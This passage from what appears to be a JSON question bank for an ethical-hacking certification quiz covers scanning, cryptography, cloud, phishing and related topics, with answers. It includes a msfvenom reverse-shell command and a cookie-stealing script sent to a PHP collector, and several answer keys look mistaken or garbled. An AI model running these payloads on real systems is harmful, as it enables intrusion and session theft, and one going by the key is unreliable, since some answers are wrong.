      "Pharming attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name. Phishing attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities.",
      "Both pharming and phishing attacks are purely technical.",
      "Phishing attack: an attacker provides the victim with a URL that is either misspelled or looks similar to the legitimate website's domain name. Pharming attack: a victim is redirected to a fake website by modifying their host configuration file or exploiting DNS vulnerabilities."
    ]
  },
  {
    "question": "To bypass firewalls using the DNS tunnelling method to exfiltrate data, you can use the NSTX tool. On which of the following ports should be run the NSTX tool?",
    "answer": "53",
    "hint": null,
    "options": [
      "53",
      "23",
      "80",
      "50"
    ]
  },
  {
    "question": "Which of the following vulnerabilities will you use if you know that the target network uses WPA3 encryption?",
    "answer": "Dragonblood",
    "hint": null,
    "options": [
      "Cross-site request forgery",
      "Dragonblood",
      "AP misconfiguration",
      "Key reinstallation attack"
    ]
  },
  {
    "question": "During a port scan on the target host, your colleague sends FIN/ACK probes and finds that an RST packet is sent in response by the target host, indicating that the port is closed. Which of the following port scanning techniques did your colleague use?",
    "answer": "TCP Maimon scan",
    "hint": null,
    "options": [
      "Xmas scan",
      "ACK flag probe scan",
      "TCP Maimon scan",
      "IDLE/IPID header scan"
    ]
  },
  {
    "question": "During the scan, you found a serious vulnerability, compiled a report and sent it to your colleagues. In response, you received proof that they fixed this vulnerability a few days ago. How can you characterize this vulnerability?",
    "answer": "False-positive",
    "hint": null,
    "options": [
      "False-positive",
      "False-true",
      "True-false",
      "False-negative"
    ]
  },
  {
    "question": "Which of the following rootkit types sits undetected in the core components of the operating system?",
    "answer": "Kernel rootkit",
    "hint": null,
    "options": [
      "Hypervisor rootkit",
      "Kernel rootkit",
      "Firmware rootkit",
      "Hardware rootkit"
    ]
  },
  {
    "question": "Your organization has a public key infrastructure set up. Your colleague Bernard wants to send a message to Joan. Therefore, Bernard both encrypts the message and digitally signs it. Bernard uses ____ to encrypt the message for these purposes, and Joan uses ____ to confirm the digital signature.",
    "answer": "Joan's public key; Bernard's public key.",
    "hint": null,
    "options": [
      "Joan's public key; Bernard's public key.",
      "Bernard's public key; Bernard's public key.",
      "Joan's public key; Joan's public key.",
      "Joan's private key; Bernard's public key."
    ]
  },
  {
    "question": "A post-breach forensic investigation revealed that a known vulnerability in Apache Struts was to blame for the Equifax data breach that affected 147 million people In September of 2017. At the same time fix was available from the software vendor for several months before the intrusion. In which of the following security processes has failed?",
    "answer": "Patch management",
    "hint": null,
    "options": [
      "Patch management",
      "Vendor risk management",
      "Security awareness training",
      "Secure development lifecycle"
    ]
  },
  {
    "question": "Ivan, the evil hacker, decided to use Nmap scan open ports and running services on systems connected to the target organization's OT network. For his purposes, he enters the Nmap command into the terminal which identifies Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following commands did Ivan use in this scenario?",
    "answer": "nmap -Pn -sU -p 44818 --script enip-info < Target IP >",
    "hint": null,
    "options": [
      "nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >",
      "nmap -Pn -sT -p 46824 < Target IP >",
      "nmap -Pn -sT -p 102 --script s7-info < Target IP >",
      "nmap -Pn -sU -p 44818 --script enip-info < Target IP >"
    ]
  },
  {
    "question": "You need to transfer sensitive data of the organization between industrial systems securely. For these purposes, you have decided to use short-range wireless communication technology that meets the following requirements: - Protocol based on the IEEE 203.15.4 standard; - Range of 10-100 m. - Designed for small-scale projects which need wireless connection. Which of the following protocols will meet your requirements?",
    "answer": "Zigbee",
    "hint": null,
    "options": [
      "MQTT",
      "Zigbee",
      "LPWAN",
      "NB-IoT"
    ]
  },
  {
    "question": "Which of the following is a correct example of using msfvenom to generate a reverse TCP shellcode for Windows?",
    "answer": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe",
    "hint": null,
    "options": [
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f c",
      "msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f c",
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=8888 -f exe > shell.exe"
    ]
  },
  {
    "question": "A competitor organization has hired a professional hacker who could collect sensitive information about your organization. The hacker starts by gathering the server IP address of the target organization using Whois footprinting. After this, he entered the server IP address as an input to an online tool to retrieve information such as your organization's network range and identify the network topology and operating system used in the network. Which of the following tools did the hacker use for this purpose?",
    "answer": "ARIN",
    "hint": null,
    "options": [
      "Baidu",
      "AOL",
      "ARIN",
      "DuckDuckGo"
    ]
  },
  {
    "question": "Which of the following ports must you block first in case that you are suspicious that an IoT device has been compromised?",
    "answer": "48101",
    "hint": null,
    "options": [
      "8080",
      "22",
      "80",
      "48101"
    ]
  },
  {
    "question": "You performed a tool-based vulnerability assessment and found vulnerabilities. You have started to analyze these issues and found that they are not true vulnerabilities. How can you characterize these issues?",
    "answer": "False positives",
    "hint": null,
    "options": [
      "True positives",
      "True negatives",
      "False positives",
      "False negatives"
    ]
  },
  {
    "question": "Antonio wants to infiltrate the target organization's network. To accomplish this task, he used a technique using which he encoded packets with Unicode characters. The target company’s IDS cannot recognize the packets, but the target web server can decode them. Which of the following techniques did Antonio use to evade the IDS system?",
    "answer": "Obfuscating",
    "hint": null,
    "options": [
      "Obfuscating",
      "Urgency flag",
      "Session splicing",
      "Desynchronization"
    ]
  },
  {
    "question": "Your company follows the five-tier container technology architecture. Your colleagues use container technology to deploy applications/software. In this process, they include all dependencies, such as libraries and configuration files, binaries, and other resources that run independently from other processes in the cloud environment. Now they verify and validate image contents, sign images, and send them to the registries. At which of the following tiers are your colleagues currently working according to the five-tier container technology architecture?",
    "answer": "Tier-2: Testing and accreditation systems.",
    "hint": null,
    "options": [
      "Tier-2: Testing and accreditation systems.",
      "Tier-3: Registries.",
      "Tier-4: Orchestrators.",
      "Tier-1: Developer machines."
    ]
  },
  {
    "question": "According to Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, which of the following ranges is the medium?",
    "answer": "4.0-6.9",
    "hint": null,
    "options": [
      "4.0-6.9",
      "4.0-6.0",
      "3.0-6.9",
      "3.9-6.9"
    ]
  },
  {
    "question": "Identify the exploit framework whose capabilities include automated attacks on services, ports, applications and unpatched security flaws?",
    "answer": "Metasploit",
    "hint": null,
    "options": [
      "Maltego",
      "Wireshark",
      "Nessus",
      "Metasploit"
    ]
  },
  {
    "question": "You were instructed to check the configuration of the webserver and you found that the server permits SSLv2 connections, and the same private key certificate is used on a different server that allows SSLv2 connections. You understand that this vulnerability makes the web server vulnerable to attacks as the SSLv2 server can leak key information. Which of the following attacks can an attacker perform using this vulnerability?",
    "answer": "DROWN attack",
    "hint": null,
    "options": [
      "Padding oracle attack",
      "DUHK attack",
      "Side-channel attack",
      "DROWN attack"
    ]
  },
  {
    "question": "You simulate an attack on your organization's network resources and target the NetBIOS service. You decided to use the NetBIOS API for this attack and perform an enumeration. After finishing, you found that port 139 was open, and you could see the resources that could be accessed or viewed on a remote system. Also, you came across many NetBIOS codes during enumeration. Which of the following NetBIOS codes is used for obtaining the messenger service running for the logged-in user?",
    "answer": "<03>",
    "hint": null,
    "options": [
      "<20>",
      "<00>",
      "<03>",
      "<1B>"
    ]
  },
  {
    "question": "Your company has hired Jack, a cybersecurity specialist, to conduct another pentest. Jack immediately decided to get to work. He launched an attack on the DHCP servers by broadcasting forged DHCP requests and leased all the DHCP addresses available in the DHCP scope until the server could not issue any more IP addresses. As a result of these actions, a DDoS attack occurred, and legitimate employees could not access the company's network. Which of the following attacks did Jack perform?",
    "answer": "DHCP starvation",
    "hint": null,
    "options": [
      "VLAN hopping",
      "Rogue DHCP server attack",
      "STP attack",
      "DHCP starvation"
    ]
  },
  {
    "question": "Which of the following Metasploit Framework tool can be used to bypass antivirus?",
    "answer": "msfencode",
    "hint": null,
    "options": [
      "msfcli",
      "msfpayload",
      "msfd",
      "msfencode"
    ]
  },
  {
    "question": "Identify the attack by description: The attacker decides to attack IoT devices. First, he will record the frequency required to share information between connected devices. Once he gets the necessary frequency, the attacker will capture the original data when the connected devices initiate commands. As soon as he collects original data, he will use tools such as URH to segregate the command sequence. The final step in this attack will be starting injecting the segregated command sequence on the same frequency into the IoT network, which repeats the captured signals of the devices.",
    "answer": "Replay attack.",
    "hint": null,
    "options": [
      "Replay attack.",
      "Side-channel attack.",
      "Reconnaissance attack.",
      "Cryptanalysis attack."
    ]
  },
  {
    "question": "Identify the attack by description: This attack is performed at layer 7 to take down web infrastructure. During its execution, partial HTTP requests are sent to the web infrastructure or applications and upon receiving a partial request, the target server opens multiple connections and keeps waiting for the requests to complete.",
    "answer": "Slowloris attack",
    "hint": null,
    "options": [
      "Phlashing",
      "Session splicing",
      "Slowloris attack",
      "Desynchronization"
    ]
  },
  {
    "question": "You need to describe the principal characteristics of the vulnerability and make a numerical estimate reflecting its severity using CVSS v3.0 to properly assess and prioritize the organization’s vulnerability management processes. As a result of the research, you received a basic score of 4.0 according to CVSS rating. What is the CVSS severity level of the vulnerability discovered?",
    "answer": "Medium",
    "hint": null,
    "options": [
      "High",
      "Low",
      "Critical",
      "Medium"
    ]
  },
  {
    "question": "Which of the following files determines the basic configuration in an Android application, such as broadcast receivers, services, etc.?",
    "answer": "AndroidManifest.xml",
    "hint": null,
    "options": [
      "resources.asrc",
      "APK.info",
      "classes.dex",
      "AndroidManifest.xml"
    ]
  },
  {
    "question": "Which of the following AAA protocols can use for authentication users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network?",
    "answer": "RADIUS",
    "hint": null,
    "options": [
      "TACACS",
      "Kerberos",
      "DIAMETER",
      "RADIUS"
    ]
  },
  {
    "question": "You found that sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. Which of the following protocols, which can send data using encryption and digital certificates, will help solve this problem?",
    "answer": "FTPS",
    "hint": null,
    "options": [
      "IP",
      "FTP",
      "HTTPS",
      "FTPS"
    ]
  },
  {
    "question": "John wants to attack the target organization, but before that, he needs to gather information. For these purposes, he performs DNS footprinting to gather information about DNS servers and identify the hosts connected to the target network. John is going to use an automated tool that can retrieve information about DNS zone data, including DNS domain names, computer names, IP addresses, DNS records, and network Whois records. Which of the following tools will John use?",
    "answer": "Bluto",
    "hint": null,
    "options": [
      "Bluto",
      "zANTI",
      "Towelroot",
      "Knative"
    ]
  },
  {
    "question": "Identify the protocol used to secure an LDAP service against anonymous queries?",
    "answer": "NTLM",
    "hint": null,
    "options": [
      "SSO",
      "NTLM",
      "RADIUS",
      "WPA"
    ]
  },
  {
    "question": "You need to use information security controls that create an appealing isolated environment for hackers to prevent them from compromising critical targets while simultaneously gathering information about the hacker. Which of the following will you use for this purpose?",
    "answer": "Honeypot",
    "hint": null,
    "options": [
      "Firewall",
      "Intrusion detection system",
      "Botnet",
      "Honeypot"
    ]
  },
  {
    "question": "Which of the following Nmap commands perform a stealth scan?",
    "answer": "nmap –sS",
    "hint": null,
    "options": [
      "nmap –sS",
      "nmap -sU",
      "nmap -sT",
      "nmap -sM"
    ]
  },
  {
    "question": "Johnny decided to gather information for identity theft from the target organization. He wants to redirect the organization’s web traffic to a malicious website. After some thought, he plans to perform DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and wants to modify the original IP address of the target website to that of a malicious website. Which of the following techniques does Johnny plan to use?",
    "answer": "Pharming",
    "hint": null,
    "options": [
      "Pretexting",
      "Pharming",
      "Skimming",
      "Wardriving"
    ]
  },
  {
    "question": "You have successfully executed the attack and launched the shell on the target network. Now you want to identify all the OS of machines running on this network. You are trying to run the Nmap command to perform this task and see the following: 1. hackeduser@hackedserver.~$ nmap -T4 -O 192.168.0.0/24 2. TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx xxxxxxxxx. 3. QUITTING! Why couldn't the scan be performed?",
    "answer": "OS Scan requires root privileges.",
    "hint": null,
    "options": [
      "The shell is not stabilized.",
      "OS Scan requires root privileges.",
      "The nmap syntax is wrong.",
      "The outgoing TCP/IP fingerprinting is blocked by the host firewall."
    ]
  },
  {
    "question": "Your company has decided to purchase a subscription to a cloud-hosted solution. After purchasing this solution, the only administrative task of your employees will be the management of user accounts. The provider will cover all hardware, operating system, and software administration (including patching and monitoring). Which of the following is this type of solution?",
    "answer": "Saas",
    "hint": null,
    "options": [
      "Saas",
      "PaaS",
      "Caas",
      "Iaas"
    ]
  },
  {
    "question": "Which of the following is the firewall evasion scanning technique that uses a zombie system with low network activity?",
    "answer": "Idle scanning",
    "hint": null,
    "options": [
      "Spoof source address scanning",
      "Decoy scanning",
      "Idle scanning",
      "Packet fragmentation scanning"
    ]
  },
  {
    "question": "You are the head of the Network Administrators department. And one of your subordinates uses SNMP to manage networked devices from a remote location. And one of your subordinates uses SNMP to manage networked devices from a remote location. To manage network nodes, your subordinate uses MIB, which contains formal descriptions of all network objects managed by SNMP. He accesses the contents of MIB by using a web browser either by entering the IP address and Lseries.mib or by entering the DNS library name and Lseries.mib. You know that your subordinate can retrieve information from a MIB that contains object types for workstations and server services. Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services?",
    "answer": "LNMIB2.MIB",
    "hint": null,
    "options": [
      "WINS.MIB",
      "DHCP.MIB",
      "LNMIB2.MIB",
      "MIB_II.MIB"
    ]
  },
  {
    "question": "You want to make your life easier and automate the process of updating applications. You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. What is the name of this technique?",
    "answer": "Webhooks",
    "hint": null,
    "options": [
      "Webhooks",
      "Web shells",
      "SOAP API",
      "REST API"
    ]
  },
  {
    "question": "Recently your company set up a cloud computing service. Your system administrator reached out to a telecom company to provide Internet connectivity and transport services between the organization and the cloud service provider to implement this service. Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture?",
    "answer": "Cloud carrier",
    "hint": null,
    "options": [
      "Cloud consumer",
      "Cloud carrier",
      "Cloud broker",
      "Cloud auditor"
    ]
  },
  {
    "question": "Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. Which of the following countermeasures is the target company using to protect against rainbow tables?",
    "answer": "Password salting",
    "hint": null,
    "options": [
      "Password salting",
      "Password hashing",
      "Password key hashing",
      "Account lockout"
    ]
  },
  {
    "question": "The attacker performs an attack during which, using a MITM attack technique, he sends his session ID using. Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. Which of the following attacks was the attacker performing?",
    "answer": "Session donation",
    "hint": null,
    "options": [
      "Session fixation",
      "CRIME",
      "Session donation",
      "Forbidden"
    ]
  },
  {
    "question": "Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application?",
    "answer": "RESTful API",
    "hint": null,
    "options": [
      "REST API",
      "JSON-RPC",
      "RESTful API",
      "SOAP API"
    ]
  },
  {
    "question": "Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server?",
    "answer": "Cross-site request forgery",
    "hint": null,
    "options": [
      "Cross-site request forgery",
      "Cross-site scripting",
      "Server-side request forgery",
      "Session hijacking"
    ]
  },
  {
    "question": "The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. What is the social engineering technique the attacker used in this scenario?",
    "answer": "Honey trap",
    "hint": null,
    "options": [
      "Baiting",
      "Piggybacking",
      "Honey trap",
      "Diversion theft"
    ]
  },
  {
    "question": "Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits?",
    "answer": "Twofish",
    "hint": null,
    "options": [
      "Twofish",
      "HMAC",
      "Blowfish",
      "IDEA"
    ]
  },
  {
    "question": "All the industrial control systems of your organization are connected to the Internet. Your management wants to empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption. You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools will you use to accomplish this task?",
    "answer": "Flowmon",
    "hint": null,
    "options": [
      "Robotium",
      "IntentFuzzer",
      "BalenaCloud",
      "Flowmon"
    ]
  },
  {
    "question": "Based on this log, which of the following is true?",
    "answer": "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server.",
    "hint": null,
    "options": [
      "SSH communications are encrypted; it's impossible to know who is the client or the server.",
      "Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the server.",
      "Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the client.",
      "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server."
    ]
  },
  {
    "question": "Identify the attack by description: When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website.",
    "answer": "aLTEr attack",
    "hint": null,
    "options": [
      "Jamming signal attack",
      "aLTEr attack",
      "KRACK attack",
      "Wardriving"
    ]
  },
  {
    "question": "Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. What service is running on this port, and how can you fix this problem?",
    "answer": "The service is LDAP. You must change it to 636, which is LDAPS.",
    "hint": null,
    "options": [
      "The service is LDAP. You must change it to 636, which is LDAPS.",
      "The findings do not require immediate actions and are only suggestions.",
      "The service is NTP, and you have to change it from UDP to TCP to encrypt it.",
      "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails."
    ]
  },
  {
    "question": "The attacker plans to compromise the systems of organizations by sending malicious emails. He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. Which of the following tools is used by the attacker?",
    "answer": "Infoga",
    "hint": null,
    "options": [
      "Infoga",
      "Netcraft",
      "ZoomInfo",
      "Factiva"
    ]
  },
  {
    "question": "The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. Which of the following advanced operators will he use to restrict the search to the organization’s web domain?",
    "answer": "[site:]",
    "hint": null,
    "options": [
      "[link:]",
      "[site:]",
      "[location:]",
      "[allinurl:]"
    ]
  },
  {
    "question": "Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. Which of the following attacks is described in this scenario?",
    "answer": "Phishing",
    "hint": null,
    "options": [
      "Vishing",
      "Phishing",
      "Spoofing",
      "DDoS"
    ]
  },
  {
    "question": "While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. Which of the following protocols is used in your organization's wireless network?",
    "answer": "WEP",
    "hint": null,
    "options": [
      "WEP",
      "WPA3",
      "RADIUS",
      "WPA"
    ]
  },
  {
    "question": "Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment?",
    "answer": "Community",
    "hint": null,
    "options": [
      "Private",
      "Hybrid",
      "Community",
      "Public"
    ]
  },
  {
    "question": "Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. Which of the following will be the best solution for Matthew?",
    "answer": "Install Cryptcat and encrypt outgoing packets from this server.",
    "hint": null,
    "options": [
      "Use Alternate Data Streams to hide the outgoing packets from this server.",
      "Install Cryptcat and encrypt outgoing packets from this server.",
      "Install and use Telnet to encrypt all outgoing traffic from this server.",
      "Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems."
    ]
  },
  {
    "question": "Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it?",
    "answer": "Disable SSID broadcasting",
    "hint": null,
    "options": [
      "Lock all users",
      "Delete the wireless network",
      "Disable SSID broadcasting",
      "Remove all passwords"
    ]
  },
  {
    "question": "Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible?",
    "answer": "TPM",
    "hint": null,
    "options": [
      "CPU",
      "GPU",
      "TPM",
      "UEFI"
    ]
  },
  {
    "question": "Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform?",
    "answer": "Cross-Site Request Forgery",
    "hint": null,
    "options": [
      "Browser Hacking",
      "Cross-Site Scripting",
      "Cross-Site Request Forgery",
      "SQL Injection"
    ]
  },
  {
    "question": "Which of the following SQLi types leverages a database server’s ability to make DNS requests to pass data to an attacker?",
    "answer": "Out-of-band SQLi",
    "hint": null,
    "options": [
      "Union-based SQLi",
      "Time-based blind SQLi",
      "Out-of-band SQLi",
      "In-band SQLi"
    ]
  },
  {
    "question": "As usual, you want to open your online banking from your home computer. You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. Which of the following types of attacks have you been exposed to?",
    "answer": "DNS hijacking",
    "hint": null,
    "options": [
      "ARP cache poisoning",
      "DHCP spoofing",
      "DoS attack",
      "DNS hijacking"
    ]
  },
  {
    "question": "The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. Which of the following standards has the medical organization violated?",
    "answer": "HIPAA/PHI",
    "hint": null,
    "options": [
      "HIPAA/PHI",
      "PII",
      "ISO 2002",
      "PCI DSS"
    ]
  },
  {
    "question": "Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates?",
    "answer": "Stealth virus",
    "hint": null,
    "options": [
      "Tunneling virus",
      "Encryption virus",
      "Cavity virus",
      "Stealth virus"
    ]
  },
  {
    "question": "Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys?",
    "answer": "Triple DES",
    "hint": null,
    "options": [
      "AES",
      "Triple DES",
      "DES",
      "IDEA"
    ]
  },
  {
    "question": "Your organization is implementing a vulnerability management program to evaluate and control the risks and vulnerabilities in IT infrastructure. At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. Which of the following vulnerability-management phases is your security department in?",
    "answer": "Remediation",
    "hint": null,
    "options": [
      "Verification",
      "Remediation",
      "Risk assessment",
      "Vulnerability scan"
    ]
  },
  {
    "question": "You have discovered that someone is posting strange images without comments on your forum. You decide to check it out and discover the following code is hidden behind those images: 1. <script> 2. document.write(\"<img.src='https://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '\" />'); 3. </script> What does this script do?",
    "answer": "This PHP file silently executes the code and grabs the user's session cookie and session ID.",
    "hint": null,
    "options": [
      "This PHP file silently executes the code and grabs the user's session cookie and session ID.",
      "The code is a virus that is attempting to gather the user's username and password.",
      "The code injects a new cookie into the browser.",
      "The code redirects the user to another site."
    ]
  },
  {
    "question": "Your organization conducts a vulnerability assessment for mitigating threats. Your task is to scan the organization by building an inventory of the protocols found on the organization’s machines to detect which ports are attached to services such as a web server, an email server or a database server. After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. Which of the following type of vulnerability assessment solutions will you perform?",
    "answer": "Inference-based assessment",
    "hint": null,
    "options": [
      "Inference-based assessment",
      "Tree-based assessment",
      "Service-based solutions",
      "Product-based solutions"
    ]
  },
  {
    "question": "What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting?",
    "answer": "Robots.txt",
    "hint": null,
    "options": [
      "Robots.txt",
      "Document root",
      "index.html",
      "domain.txt"
    ]
  },
  {
    "question": "Alex works as a network administrator at ClassicUniversity. There are many Ethernet ports available for professors and authorized visitors (but not for students) on the university campus. However, Alex realized that some students connect their notebooks to the wired network to have Internet access. He identified this when the IDS alerted for malware activities in the network. What should Alex do to avoid this problem?",
    "answer": "Use the 802.1x protocol.",
    "hint": null,
    "options": [
      "Disable unused ports in the switches.",
      "Ask students to use the wireless network.",
      "Separate students in a different VLAN.",
      "Use the 802.1x protocol."
    ]
  },
  {
    "question": "An attacker stole financial information from a bank by compromising only a single server. After that, the bank decided to hire a third-party organization to conduct a full security assessment. Cybersecurity specialists have been provided with information about this case, and they need to provide an initial recommendation. Which of the following will be the best recommendation?",
    "answer": "Place a front-end web server in a demilitarized zone that only handles external web traffic.",
    "hint": null,
    "options": [
      "Move the financial data to another server on the same IP subnet.",
      "Require all employees to change their passwords immediately.",
      "Place a front-end web server in a demilitarized zone that only handles external web traffic.",
      "Issue new certificates to the web servers from the root certificate authority."
    ]
  },
  {
    "question": "Which of the following components of IPsec provides confidentiality for the content of packets?",
    "answer": "ESP",
    "hint": null,
    "options": [
      "AH",
      "IKE",
      "ESP",
      "ISAKMP"
    ]
  },
  {
    "question": "Transmission Control Protocol accepts data from a data stream, divides it into chunks, and adds a TCP header creating a TCP segment. A TCP segment consists of a segment header and a data section. The segment header contains 10 mandatory fields and an optional extension field. Which of the suggested fields is not included in the TCP segment header?",
    "answer": "Source IP address",
    "hint": null,
    "options": [
      "Checksum",
      "Sequence Number",
      "Source Port",
      "Source IP address"
    ]
  },
  {
    "question": "Identify the way to achieve chip-level security of an IoT device?",
    "answer": "Encrypting the JTAG interface",
    "hint": null,
    "options": [
      "Changing the password of the router",
      "Turning off the device when not needed or not in use",
      "Closing insecure network services",
      "Encrypting the JTAG interface"
    ]
  },
  {
    "question": "One of the most popular tools in the pentester's arsenal - John the Ripper is designed for...",
    "answer": "Test password strength, brute-force encrypted or hashed passwords, and crack passwords via dictionary attacks.",
    "hint": null,
    "options": [
      "Discover hosts and services on a computer network by sending packets and analyzing the responses.",
      "Automation of the process of detecting and exploiting the SQL injection vulnerability.",
      "Test password strength, brute-force encrypted or hashed passwords, and crack passwords via dictionary attacks.",
      "Search for various default and insecure files, configurations, and programs on any type of web servers."
    ]
  },
  {
    "question": "In what type of testing does the tester have some information about the internal work of the application?",
    "answer": "Grey-box",
    "hint": null,
    "options": [
      "Announced",
      "Black-box",
      "White-box",
      "Grey-box"
    ]
  },
  {
    "question": "The analyst needs to evaluate the possible threats to Blackberry phones for a third-party company. To do this, he will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defenses and gain access to the corporate network. Which of the following tools is best suited for the analyst for this task?",
    "answer": "BBProxy",
    "hint": null,
    "options": [
      "BBProxy",
      "Paros Proxy",
      "BBCrack",
      "Blooover"
    ]
  },
  {
    "question": "In order to prevent collisions and protect password hashes from rainbow tables, Maria, the system administrator, decides to add random data strings to the end of passwords before hashing. What is the name of this technique?",
    "answer": "Salting",
    "hint": null,
    "options": [
      "Stretching",
      "Salting",
      "Extra hashing",
      "Masking"
    ]
  },
  {
    "question": "Maria, the leader of the Blue Team, wants to use network traffic analysis to implement the ability to detect an intrusion in her network of several hosts quickly. Which tool is best suited to perform this task?",
    "answer": "NIDS",
    "hint": null,
    "options": [
      "Firewalls",
      "HIDS",
      "NIDS",
      "Honeypot"
    ]
  },
  {
    "question": "Identify a component of a risk assessment.",
    "answer": "Administrative safeguards",
    "hint": null,
    "options": [
      "Physical security",
      "Logical interface",
      "DMZ",
      "Administrative safeguards"
    ]
  },
  {
    "question": "Which of the following types of keys does the Heartbleed bug expose to the Internet, making exploiting any compromised system very easy?",
    "answer": "Private",
    "hint": null,
    "options": [
      "Shared",
      "Private",
      "Root",
      "Public"
    ]
  },
  {
    "question": "Shortly after replacing the outdated equipment, John, the company's system administrator, discovered a leak of critical customer information. Moreover, among the stolen data was the new user’s information that excludes incorrect disposal of old equipment. IDS did not notice the intrusion, and the logging system shows that valid credentials were used. Which of the following is most likely the cause of this problem?",
    "answer": "Default Credential",
    "hint": null,
    "options": [
      "Default Credential",
      "NSA backdoor",
      "Industrial Espionage",
      "Zero-day vulnerabilities"
    ]
  },
  {
    "question": "An attacker gained access to a Linux host and stolen the password file from /etc/passwd. Which of the following scenarios best describes what an attacker can do with this file?",
    "answer": "Nothing because the password file does not contain the passwords themselves.",
    "hint": null,
    "options": [
      "Nothing because he cannot read the file because it is encrypted.",
      "The attacker can perform actions as a user because he can open it and read the user ids and corresponding passwords.",
      "Nothing because the password file does not contain the passwords themselves.",
      "The attacker can perform actions as root because the file reveals the passwords to the root user only."
    ]
  },
  {
    "question": "What is the minimum number of network connections needed for a multi-homed firewall?",
    "answer": "2",
    "hint": null,
    "options": [
      "2",
      "4",
      "5",
      "3"
    ]
  },
  {
    "question": "Identify the type of attack according to the following scenario: Ivan, a black-hat hacker, initiates an attack on a certain organization. In preparation for this attack, he identified a well-known and trust website that employees of this company often use. In the next step, Ivan embeds an exploit into the website that infects the target systems of employees when using the website. After this preparation, he can only wait for the successful execution of his attack.",
    "answer": "Watering Hole",
    "hint": null,
    "options": [
      "Spear Phishing",
      "Watering Hole",
      "Shellshock",
      "Heartbleed"
    ]
  },
  {
    "question": "Which of the following documents describes the specifics of the testing, the associated violations and essentially protects both the organization's interest and third-party penetration tester?",
    "answer": "Rules of Engagement",
    "hint": null,
    "options": [
      "Project Scope",
      "Service Level Agreement",
      "Non-Disclosure Agreement",
      "Rules of Engagement"
    ]
  },
  {
    "question": "In what type of attack does the attacker forge the sender's IP address to gain access to protected systems and confidential data?",
    "answer": "IP Spoofing",
    "hint": null,
    "options": [
      "IP fragmentation attack",
      "IP Spoofing",
      "Source Routing",
      "IP forwarding"
    ]
  },
  {
